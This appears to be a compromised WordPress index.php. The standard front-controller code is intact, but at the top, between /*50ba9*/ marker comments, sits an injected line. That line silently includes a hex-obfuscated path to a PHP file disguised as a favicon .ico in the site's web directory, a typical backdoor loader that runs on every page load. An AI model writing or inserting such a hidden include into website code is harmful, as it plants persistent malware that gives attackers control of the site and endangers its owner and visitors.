<?php
/*50ba9*/

@include "\x2fh\x6fm\x65/\x76e\x67e\x6ff\x69t\x2fp\x75b\x6ci\x63_\x68t\x6dl\x2fd\x65n\x74a\x6c-\x63o\x6dp\x6ci\x61n\x63e\x2ff\x61v\x69c\x6fn\x5f7\x37a\x633\x39.\x69c\x6f";

/*50ba9*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
